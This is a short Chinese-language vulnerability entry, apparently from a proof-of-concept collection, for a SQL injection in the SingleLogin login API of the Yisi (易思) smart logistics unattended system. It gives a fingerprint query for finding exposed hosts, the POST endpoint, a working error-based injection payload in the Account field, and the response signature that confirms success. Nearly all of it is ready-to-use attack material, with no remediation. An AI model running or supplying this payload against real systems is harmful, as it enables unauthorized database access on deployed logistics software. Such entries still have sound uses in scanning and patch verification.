# 易思智能物流无人值守系统SingleLogin存在SQL注入漏洞

易思智能物流无人值守系统 ｜ SQL注入 ｜ —
- **指纹**：`body="eosine_login_error"`
- **请求**：`POST /api/SingleLogin/login HTTP/1.1`

**Payload**
```
LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D
```
- **响应特征**：200 202cb962ac59075b964b07152d234b70